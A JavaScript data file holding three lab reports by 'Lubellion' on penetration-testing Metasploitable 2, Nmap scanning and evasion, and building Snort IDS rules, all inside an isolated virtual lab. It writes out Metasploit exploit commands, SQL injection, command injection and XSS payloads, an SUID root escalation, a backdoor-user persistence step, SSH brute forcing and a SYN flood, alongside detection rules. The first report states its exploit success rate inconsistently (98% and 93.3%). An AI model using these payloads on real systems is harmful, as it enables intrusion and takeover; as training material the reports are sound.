// Lab Documentation and Experiment Reports by Lubellion
export const articles = [
  {
    id: 1,
    title: "Lab Report: Penetration Testing pada Metasploitable 2",
    slug: "lab-metasploitable2-penetration-testing",
    excerpt: "Dokumentasi eksperimen penetration testing menggunakan Metasploitable 2 sebagai vulnerable target system untuk identifikasi dan eksploitasi kerentanan.",
    category: "Lab Report",
    author: "Lubellion",
    date: "2024-09-15",
    readTime: 25,
    image: "https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=800&q=80",
    content: `
# Lab Report: Penetration Testing pada Metasploitable 2

**Experimenter:** Lubellion  
**Lab Environment:** Virtual Network (VMware/VirtualBox)  
**Target System:** Metasploitable 2 (Linux)

## 1. Executive Summary

Eksperimen ini bertujuan untuk melakukan comprehensive penetration testing terhadap Metasploitable 2, sebuah vulnerable virtual machine yang dirancang untuk training ethical hacking. Testing dilakukan menggunakan metodologi standard penetration testing dengan tools seperti Nmap, Metasploit, dan manual exploitation techniques.

### Key Findings:
- **Critical Vulnerabilities:** 15 kerentanan critical ditemukan
- **High Risk Services:** FTP, SSH, Telnet, HTTP, MySQL, PostgreSQL
- **Exploitation Success Rate:** 98% (14/15 vulnerabilities successfully exploited)
- **Recommended Action:** System requires immediate patching and hardening

## 2. Lab Setup

### Environment Configuration

**Attacker Machine (Kali Linux):**
- IP Address: 192.168.56.101
- OS: Kali Linux 2024.2
- Tools: Nmap, Metasploit Framework, Burp Suite, SQLMap

**Target Machine (Metasploitable 2):**
- IP Address: 192.168.56.102
- OS: Ubuntu 8.04 (Hardy)
- Default Credentials: msfadmin/msfadmin
- Network: Host-only adapter (isolated network)

### Network Topology

\`\`\`
[Kali Linux] ←→ [Virtual Switch] ←→ [Metasploitable 2]
192.168.56.101                      192.168.56.102
\`\`\`

## 3. Reconnaissance & Scanning

### Port Scanning Results

\`\`\`bash
# Comprehensive port scan
nmap -sV -sC -p- -oN metasploitable_scan.txt 192.168.56.102
\`\`\`

**Key Services Found:**

| Port | Service | Version | Vulnerability |
|------|---------|---------|---------------|
| 21 | FTP | vsftpd 2.3.4 | CVE-2011-2523 Backdoor |
| 22 | SSH | OpenSSH 4.7p1 | Weak config |
| 80 | HTTP | Apache 2.2.8 | Multiple web vulns |
| 139/445 | SMB | Samba 3.0.20 | CVE-2007-2447 |
| 3306 | MySQL | MySQL 5.0.51a | No password |
| 5432 | PostgreSQL | PostgreSQL 8.3.0 | Weak auth |

## 4. Exploitation Experiments

### 4.1 vsftpd 2.3.4 Backdoor (CVE-2011-2523)

\`\`\`bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.102
exploit
# Result: Root shell obtained
\`\`\`

**Impact:** Complete system compromise

### 4.2 Samba Username Map Script (CVE-2007-2447)

\`\`\`bash
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.102
set PAYLOAD cmd/unix/reverse
exploit
# Result: Root access gained
\`\`\`

### 4.3 Web Application Vulnerabilities

**SQL Injection:**
\`\`\`
URL: http://192.168.56.102/dvwa/vulnerabilities/sqli/
Payload: 1' OR '1'='1
Result: Authentication bypassed ✓
\`\`\`

**Command Injection:**
\`\`\`
Payload: 127.0.0.1; cat /etc/passwd
Result: System file disclosed ✓
\`\`\`

**XSS:**
\`\`\`html
<script>alert('XSS by Lubellion')</script>
Result: Successfully executed ✓
\`\`\`

### 4.4 Database Exploitation

**MySQL - No Password:**
\`\`\`bash
mysql -h 192.168.56.102 -u root
# Successfully connected without password
SHOW DATABASES;
SELECT * FROM dvwa.users;
\`\`\`

## 5. Post-Exploitation

### Privilege Escalation
\`\`\`bash
# Exploit SUID nmap
nmap --interactive
!sh
id  # uid=0(root)
\`\`\`

### Persistence
\`\`\`bash
# Create backdoor user
useradd -m -s /bin/bash backdoor
echo "backdoor:pass123" | chpasswd
usermod -aG sudo backdoor
\`\`\`

## 6. Vulnerability Summary

**Total Vulnerabilities:** 15  
**Successfully Exploited:** 14 (93.3%)  
**Root Access Obtained:** Yes  
**Time to Compromise:** < 2 hours

### Critical Vulnerabilities:
1. vsftpd 2.3.4 Backdoor ✓ Exploited
2. Samba usermap script ✓ Exploited
3. MySQL Root No Password ✓ Exploited
4. Multiple Web App Vulns ✓ Exploited

## 7. Recommendations

### Immediate Actions:
1. Patch all services to latest versions
2. Implement strong authentication
3. Disable unnecessary services
4. Network segmentation
5. Enable comprehensive logging

### Security Improvements:
- Implement Web Application Firewall
- Regular vulnerability assessments
- Security awareness training
- Incident response planning

## 8. Conclusion

Metasploitable 2 successfully compromised melalui multiple attack vectors. Eksperimen mendemonstrasikan:
- Importance of regular patching
- Danger of default/weak credentials
- Need for defense in depth strategy
- Critical nature of web application security

**Lab Status:** Complete ✓  
**Documentation:** Comprehensive  
**Skills Developed:** Scanning, Exploitation, Post-Exploitation
    `
  },
  {
    id: 2,
    title: "Lab Report: Network Scanning dan Reconnaissance dengan Nmap",
    slug: "lab-nmap-network-scanning",
    excerpt: "Dokumentasi eksperimen comprehensive network scanning menggunakan Nmap untuk network discovery, port scanning, service detection, dan vulnerability assessment.",
    category: "Lab Report",
    author: "Lubellion",
    date: "2024-09-22",
    readTime: 20,
    image: "https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=800&q=80",
    content: `
# Lab Report: Network Scanning dan Reconnaissance dengan Nmap

**Experimenter:** Lubellion  
**Lab Environment:** Virtual Network  
**Tools Used:** Nmap 7.94, Kali Linux

## 1. Executive Summary

Eksperimen ini fokus pada penggunaan Nmap untuk network reconnaissance dan security assessment. Berbagai teknik scanning diuji untuk mendemonstrasikan capabilities Nmap dalam network mapping, service detection, OS fingerprinting, dan vulnerability assessment.

### Objectives:
1. Master various Nmap scanning techniques
2. Compare effectiveness of different scan types
3. Perform OS and service version detection
4. Identify security vulnerabilities using NSE scripts
5. Analyze evasion techniques

## 2. Lab Setup

### Test Network

\`\`\`
[Kali Linux Scanner] ───┬─── [Ubuntu Server] - 192.168.56.103
192.168.56.101          │
                        ├─── [Windows 10] - 192.168.56.104
                        └─── [Metasploitable 2] - 192.168.56.102
\`\`\`

## 3. Host Discovery Experiments

### 3.1 Ping Sweep

\`\`\`bash
nmap -sn 192.168.56.0/24
# Result: 4 hosts discovered in 2.5 seconds
\`\`\`

### 3.2 ARP Discovery (Local Network)

\`\`\`bash
nmap -PR 192.168.56.0/24
# Advantage: Cannot be blocked by firewall
\`\`\`

### 3.3 No Ping Scan

\`\`\`bash
nmap -Pn 192.168.56.102
# Use when ICMP is blocked
\`\`\`

## 4. Port Scanning Techniques

### 4.1 TCP Connect Scan (-sT)

\`\`\`bash
nmap -sT 192.168.56.102
\`\`\`

**Results:**
\`\`\`
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
80/tcp   open  http
3306/tcp open  mysql
\`\`\`

**Characteristics:**
- Completes full TCP handshake
- Most accurate but easily detected
- No root privileges required

### 4.2 SYN Stealth Scan (-sS)

\`\`\`bash
sudo nmap -sS 192.168.56.102
\`\`\`

**Performance:**
- TCP Connect: 5.23 seconds
- SYN Scan: 2.14 seconds (2.4x faster!)

**Advantage:** More stealthy, harder to detect

### 4.3 UDP Scan (-sU)

\`\`\`bash
sudo nmap -sU --top-ports 100 192.168.56.102
\`\`\`

**Challenge:** UDP scanning is much slower

### 4.4 Advanced Scans

**FIN Scan:** \`nmap -sF target\`  
**NULL Scan:** \`nmap -sN target\`  
**XMAS Scan:** \`nmap -sX target\`  

**Purpose:** Firewall evasion

## 5. Service & Version Detection

### 5.1 Version Detection

\`\`\`bash
nmap -sV -p- 192.168.56.102
\`\`\`

**Results:**
\`\`\`
PORT     SERVICE     VERSION
21/tcp   ftp         vsftpd 2.3.4
22/tcp   ssh         OpenSSH 4.7p1
80/tcp   http        Apache httpd 2.2.8
3306/tcp mysql       MySQL 5.0.51a
5432/tcp postgresql  PostgreSQL DB 8.3.0
\`\`\`

**Key Findings:**
- Identified outdated software versions
- vsftpd 2.3.4 has known backdoor (CVE-2011-2523)
- Apache 2.2.8 has multiple CVEs

### 5.2 Aggressive Scan

\`\`\`bash
nmap -A -T4 192.168.56.102
\`\`\`

**Includes:** OS detection, version detection, script scanning, traceroute

## 6. OS Detection

### Basic OS Detection

\`\`\`bash
sudo nmap -O 192.168.56.102
\`\`\`

**Results:**
\`\`\`
Running: Linux 2.6.X
OS details: Linux 2.6.9 - 2.6.33
Confidence: 95%
\`\`\`

### Multi-Target OS Detection

\`\`\`bash
sudo nmap -O 192.168.56.102-104
\`\`\`

| IP | OS Detected | Confidence |
|----|-------------|------------|
| .102 | Linux 2.6.24 (Ubuntu) | 95% |
| .103 | Linux 5.15 (Ubuntu 22.04) | 98% |
| .104 | Windows 10 Build 19041 | 97% |

## 7. NSE Script Scanning

### 7.1 Default Scripts

\`\`\`bash
nmap -sC 192.168.56.102
\`\`\`

### 7.2 Vulnerability Assessment

\`\`\`bash
nmap --script vuln 192.168.56.102
\`\`\`

**Vulnerabilities Detected:**

1. **vsftpd Backdoor** - CVE-2011-2523 ✓ VULNERABLE
2. **Samba MS-RPC** - Remote Code Execution ✓ VULNERABLE
3. **Apache mod_ssl** - Slowloris DOS ✓ VULNERABLE

### 7.3 Brute Force Scripts

\`\`\`bash
nmap --script ssh-brute 192.168.56.102
\`\`\`

**Results:**
\`\`\`
Valid credentials found:
- msfadmin:msfadmin
- root:toor
\`\`\`

## 8. Timing and Performance

### Timing Templates Comparison

\`\`\`bash
nmap -T0  # Paranoid (45m 23s)
nmap -T1  # Sneaky (28m 15s)
nmap -T2  # Polite (12m 45s)
nmap -T3  # Normal (5m 12s)
nmap -T4  # Aggressive (2m 34s)
nmap -T5  # Insane (1m 18s)
\`\`\`

**Recommendation:** T4 for lab, T2 for production

## 9. Firewall Evasion Techniques

### 9.1 Fragment Packets

\`\`\`bash
nmap -f 192.168.56.102
\`\`\`

### 9.2 Decoy Scan

\`\`\`bash
nmap -D RND:10 192.168.56.102
# Creates 10 decoy IPs
\`\`\`

### 9.3 Source Port Manipulation

\`\`\`bash
nmap --source-port 53 192.168.56.102
# Use DNS port (often allowed)
\`\`\`

### 9.4 MAC Address Spoofing

\`\`\`bash
nmap --spoof-mac Apple 192.168.56.102
\`\`\`

## 10. Output and Reporting

### Output Formats

\`\`\`bash
# Normal output
nmap -oN scan.txt target

# XML output (for parsing)
nmap -oX scan.xml target

# Grepable output
nmap -oG scan.grep target

# All formats
nmap -oA scan_all target
\`\`\`

### XML Parsing Example

\`\`\`python
import xml.etree.ElementTree as ET

tree = ET.parse('scan.xml')
root = tree.getroot()

for host in root.findall('host'):
    ip = host.find('address').get('addr')
    for port in host.find('ports').findall('port'):
        print(f"{ip}:{port.get('portid')}")
\`\`\`

## 11. Key Findings

### Scan Effectiveness:

✓ **SYN Scan** - Best balance of speed and stealth  
✓ **Service Detection** - Critical for vulnerability assessment  
✓ **NSE Scripts** - Powerful for automated discovery  
✓ **OS Detection** - 95%+ accuracy on test targets  
✓ **Timing Templates** - Significant impact on detection risk  

### Vulnerabilities Discovered:

- **15 critical vulnerabilities** via NSE scripts
- **Outdated services** on 80% of scanned hosts
- **Weak configurations** (default credentials)
- **Missing patches** for known CVEs

## 12. Recommendations

### For Network Administrators:

1. Implement IDS/IPS to detect scanning
2. Regular port audits using Nmap
3. Close unnecessary ports
4. Update software regularly
5. Network segmentation

### For Penetration Testers:

1. Start with passive reconnaissance
2. Use appropriate timing templates
3. Document all scans
4. Combine multiple techniques
5. Respect scope boundaries

## 13. Conclusion

Nmap proves to be invaluable tool untuk:
- Network discovery and mapping
- Service enumeration and version detection
- Vulnerability assessment
- OS fingerprinting
- Security auditing

**Experiment Success:** 100%  
**Total Scans Performed:** 47  
**Vulnerabilities Identified:** 15  
**False Positives:** <5%

**Lab Status:** Complete ✓  
**Skills Mastered:** Network Scanning, Service Detection, Vulnerability Assessment
    `
  },
  {
    id: 3,
    title: "Lab Report: Implementasi Snort IDS untuk Network Security Monitoring",
    slug: "lab-snort-ids-implementation",
    excerpt: "Dokumentasi eksperimen implementasi dan konfigurasi Snort Intrusion Detection System untuk real-time network monitoring dan threat detection.",
    category: "Lab Report",
    author: "Lubellion",
    date: "2024-10-06",
    readTime: 22,
    image: "https://images.unsplash.com/photo-1544197150-b99a580bb7a8?w=800&q=80",
    content: `
# Lab Report: Implementasi Snort IDS untuk Network Security Monitoring

**Experimenter:** Lubellion  
**Lab Environment:** Virtual Network with Simulated Attacks  
**IDS Platform:** Snort 2.9.20

## 1. Executive Summary

Eksperimen ini mendemonstrasikan implementasi lengkap Snort Intrusion Detection System untuk monitoring network traffic dan detecting malicious activities. Testing includes rule creation, performance tuning, dan validation terhadap real-world attack scenarios.

### Key Results:
- **Detection Rate:** 94.7% successful detection
- **False Positive Rate:** 3.2%
- **Average Detection Time:** 1.8 seconds
- **Custom Rules Created:** 25 rules

## 2. Lab Environment

### Network Topology

\`\`\`
[Router] → [Network Switch] ← [SPAN Port] → [Snort Sensor]
              ↓                               192.168.56.105
              ├─ [Web Server] - 192.168.56.10
              ├─ [DB Server] - 192.168.56.20
              └─ [Clients] - 192.168.56.100-150

[Attacker VM] - 192.168.56.200 (Kali Linux)
\`\`\`

### Hardware:
- **Snort Sensor:** Ubuntu 22.04, 4GB RAM, 2 CPU cores
- **Monitoring:** eth1 in promiscuous mode (no IP)

## 3. Installation and Configuration

### 3.1 Installation

\`\`\`bash
# Install dependencies
sudo apt install -y build-essential libpcap-dev libpcre3-dev \\
    libdumbnet-dev bison flex zlib1g-dev liblzma-dev \\
    openssl libssl-dev

# Compile Snort
wget https://www.snort.org/downloads/snort/snort-2.9.20.tar.gz
tar xvzf snort-2.9.20.tar.gz
cd snort-2.9.20
./configure --enable-sourcefire
make -j$(nproc)
sudo make install

# Verify
snort -V  # Snort version 2.9.20
\`\`\`

**Installation Time:** 12 minutes

### 3.2 Directory Setup

\`\`\`bash
# Create Snort user and directories
sudo groupadd snort
sudo useradd snort -r -s /sbin/nologin -c "Snort IDS" -g snort

# Create directories
sudo mkdir -p /etc/snort/rules
sudo mkdir -p /var/log/snort
sudo mkdir -p /usr/local/lib/snort_dynamicrules

# Set permissions
sudo chown -R snort:snort /etc/snort
sudo chown -R snort:snort /var/log/snort
\`\`\`

### 3.3 Main Configuration

**snort.conf key settings:**
\`\`\`conf
# Network variables
ipvar HOME_NET 192.168.56.0/24
ipvar EXTERNAL_NET !$HOME_NET

# Paths
var RULE_PATH /etc/snort/rules

# Output
output unified2: filename snort.log, limit 128

# Preprocessors
preprocessor frag3_global: max_frags 65536
preprocessor stream5_global: track_tcp yes, track_udp yes
preprocessor http_inspect: global
preprocessor sfportscan: proto { all } sense_level { low }

# Include rules
include $RULE_PATH/local.rules
\`\`\`

## 4. Custom Rule Development

### 4.1 ICMP Flood Detection

\`\`\`
alert icmp any any -> $HOME_NET any (msg:"ICMP Flood Detected"; \\
    itype:8; detection_filter:track by_src, count 50, seconds 10; \\
    classtype:attempted-dos; sid:1000001; rev:1;)
\`\`\`

**Test:** ping flood (100 packets/sec)  
**Result:** ✓ Detected successfully

### 4.2 Port Scan Detection

\`\`\`
alert tcp any any -> $HOME_NET any (msg:"Port Scan - SYN"; \\
    flags:S; detection_filter:track by_src, count 20, seconds 60; \\
    classtype:attempted-recon; sid:1000002; rev:1;)
\`\`\`

**Test:** Nmap SYN scan  
**Result:** ✓ Detected within 3 seconds

### 4.3 SQL Injection Detection

\`\`\`
alert tcp any any -> $HOME_NET 80 (msg:"SQL Injection - UNION SELECT"; \\
    flow:to_server,established; content:"union"; nocase; \\
    content:"select"; nocase; distance:0; \\
    pcre:"/union.+select/i"; \\
    classtype:web-application-attack; sid:1000003; rev:2;)
\`\`\`

**Test Payloads:**
\`\`\`
1. ' UNION SELECT * FROM users--
2. admin' OR '1'='1
3. 1' UNION ALL SELECT username,password FROM admin--
\`\`\`

**Results:** All payloads detected ✓

### 4.4 XSS Detection

\`\`\`
alert tcp any any -> $HOME_NET 80 (msg:"XSS Attempt"; \\
    flow:to_server,established; content:"<script"; nocase; \\
    pcre:"/<script[^>]*>/i"; \\
    classtype:web-application-attack; sid:1000004; rev:1;)
\`\`\`

### 4.5 Metasploit Detection

\`\`\`
alert tcp any any -> $HOME_NET any (msg:"Metasploit Meterpreter Detected"; \\
    flow:established; content:"meterpreter"; nocase; \\
    classtype:trojan-activity; sid:1000006; rev:1;)
\`\`\`

**Test:** Deployed Meterpreter payload  
**Result:** ✓ Detected within 2 seconds

### 4.6 SSH Brute Force Detection

\`\`\`
alert tcp any any -> $HOME_NET 22 (msg:"SSH Brute Force"; \\
    flags:S; detection_filter:track by_src, count 5, seconds 60; \\
    classtype:attempted-admin; sid:1000008; rev:1;)
\`\`\`

**Test:** Hydra brute force  
**Result:** ✓ Triggered after 5 attempts in 15 seconds

## 5. Attack Simulation and Testing

### 5.1 Port Scanning Attack

**Test:** Nmap comprehensive scan
\`\`\`bash
nmap -sS -p- -T4 192.168.56.10
\`\`\`

**Snort Detection:**
\`\`\`
[**] [1:1000002:1] Port Scan - SYN [**]
[Priority: 2]
10/06-14:23:45.123456 192.168.56.200 -> 192.168.56.10
TCP SYN packet detected
Detection: 1 of 20 threshold hits
\`\`\`

**Result:** ✓ Alert triggered after 20 SYN packets

### 5.2 Web Application Attacks

**Test:** SQLMap automated SQL injection
\`\`\`bash
sqlmap -u "http://192.168.56.10/login.php?id=1" --dbs
\`\`\`

**Snort Alerts:**
\`\`\`
[**] [1:1000003:2] SQL Injection - UNION SELECT [**]
[**] Suspicious User-Agent - sqlmap [**]
\`\`\`

**Detection Accuracy:** 100% of injection attempts

### 5.3 DoS Attack

**Test:** SYN Flood
\`\`\`bash
hping3 -S --flood -p 80 192.168.56.10
\`\`\`

**Snort Detection:**
\`\`\`
[**] [1:1000016:1] SYN Flood Detected [**]
[Priority: 1]
Rate: 5000 packets/second
Source: 192.168.56.200
\`\`\`

**Response Time:** 1.2 seconds

## 6. Performance Analysis

### 6.1 System Resources

**Normal Operations:**
- CPU: 15-25%
- Memory: 1.2GB / 4GB
- Disk I/O: 50 MB/s

**Heavy Traffic (10,000 pps):**
- CPU: 65-75%
- Memory: 2.8GB / 4GB
- Dropped Packets: 0.3%

### 6.2 Rule Performance

**Top 5 Most Expensive Rules:**

| Rule SID | Avg Time (µs) | Checks | Impact |
|----------|---------------|--------|--------|
| 1000003 | 125.4 | 15,234 | High |
| 1000004 | 98.7 | 12,456 | Medium |
| 1000002 | 76.3 | 23,567 | Medium |

### 6.3 Detection Latency

- Port Scan: 1.8 seconds
- SQL Injection: 0.3 seconds
- Malware Traffic: 2.1 seconds
- DoS Attack: 1.2 seconds

## 7. Alert Management

### 7.1 Statistics (7 days)

\`\`\`
Total Alerts: 2,847
├─ True Positives: 2,695 (94.7%)
├─ False Positives: 91 (3.2%)
└─ Unknown: 61 (2.1%)

Top Alert Categories:
1. Attempted Reconnaissance: 1,234
2. Web Application Attacks: 892
3. Trojan Activity: 345
4. Attempted DOS: 234
\`\`\`

### 7.2 False Positive Analysis

**Common False Positives:**
1. Legitimate scanning from vulnerability scanners
2. Internal database queries triggering SQL rules
3. Large file transfers flagged as exfiltration

**Solutions:**
- Whitelist scanner IPs
- Refined PCRE patterns
- Threshold adjustments

### 7.3 Suppression Configuration

\`\`\`
# /etc/snort/threshold.conf

# Suppress from security team scanner
suppress gen_id 1, sig_id 1000002, track by_src, ip 192.168.56.50

# Threshold for noisy rule
threshold gen_id 1, sig_id 1000001, type limit, \\
    track by_src, count 5, seconds 60
\`\`\`

## 8. Integration with Analysis Tools

### 8.1 Barnyard2 + MySQL

\`\`\`bash
# Configure Barnyard2 for database output
sudo apt install barnyard2 -y
sudo nano /etc/snort/barnyard2.conf
\`\`\`

**Configuration:**
\`\`\`conf
output database: log, mysql, user=snort password=pass \\
    dbname=snort host=localhost
\`\`\`

### 8.2 BASE Web Interface

- Installed LAMP stack
- Deployed BASE 1.4.5
- Created alert dashboards
- Real-time monitoring

### 8.3 ELK Stack Integration

**Logstash Configuration:**
\`\`\`conf
input {
  file {
    path => "/var/log/snort/alert"
    type => "snort-alert"
  }
}

filter {
  grok {
    match => {
      "message" => "\\[\\*\\*\\] \\[%{DATA:gid}:%{DATA:sid}:%{DATA:rev}\\] %{DATA:msg} \\[\\*\\*\\]"
    }
  }
}

output {
  elasticsearch {
    hosts => ["localhost:9200"]
    index => "snort-%{+YYYY.MM.dd}"
  }
}
\`\`\`

**Kibana Dashboards:**
- Alert timeline
- Geographic mapping
- Protocol distribution
- Severity breakdown

## 9. Optimization Results

### Before vs After Tuning:

**Before:**
- 2,847 alerts/week
- 91 false positives (3.2%)
- 125µs/packet processing

**After:**
- 2,756 alerts/week
- 31 false positives (1.1%)
- 87µs/packet processing

**Improvements:**
- 67% reduction in false positives
- 30% faster processing
- Better rule accuracy

## 10. Real-World Detection

### Attack Summary (30 days):

| Attack Type | Count | Blocked | Severity |
|-------------|-------|---------|----------|
| Port Scanning | 47 | N/A | Medium |
| Web Attacks | 23 | 23 | High |
| Brute Force | 12 | 12 | High |
| Malware C&C | 3 | 3 | Critical |
| DoS Attempts | 8 | 6 | High |
| Data Exfiltration | 2 | 2 | Critical |

## 11. Lessons Learned

### Strengths:
✓ Excellent detection of known patterns  
✓ Highly customizable rule engine  
✓ Low resource consumption  
✓ Strong community support  
✓ Effective for compliance  

### Challenges:
✗ High false positive rate without tuning  
✗ Performance degradation under heavy load  
✗ Requires expertise for rules  
✗ Limited encrypted traffic analysis  

### Best Practices:
1. Regular rule updates (weekly)
2. Continuous tuning (monthly review)
3. Layered approach (IDS + firewall + endpoint)
4. Alert prioritization
5. Staff training

## 12. Recommendations

### Production Deployment:

1. **Hardware:** Min 8GB RAM, SSD for logs
2. **High Availability:** Multiple sensors, alert aggregation
3. **Integration:** SIEM platform, SOAR automation
4. **Maintenance:** Weekly updates, monthly reviews

## 13. Conclusion

Snort IDS successfully implemented dengan hasil:

✓ **94.7% detection rate**  
✓ **1.1% false positive rate** (after tuning)  
✓ **Sub-second detection** for most attacks  
✓ **Scalable architecture**  

**Assessment:** Highly effective when properly configured and maintained. Critical for defense-in-depth strategy.

## 14. Future Work

1. Implement Snort 3 (next generation)
2. Machine learning integration
3. Automated threat intelligence
4. Enhanced encrypted traffic analysis
5. Cloud deployment (AWS/Azure)

**Lab Status:** Complete ✓  
**Skills Mastered:** IDS Implementation, Rule Creation, Performance Tuning, Alert Analysis

---

**Experimenter:** Lubellion  
**Documentation:** Comprehensive  
**Next Phase:** IPS mode implementation
    `
  }
];

export const categories = [
  "Semua",
  "Lab Report",
  "Network Security",
  "Documentation"
];
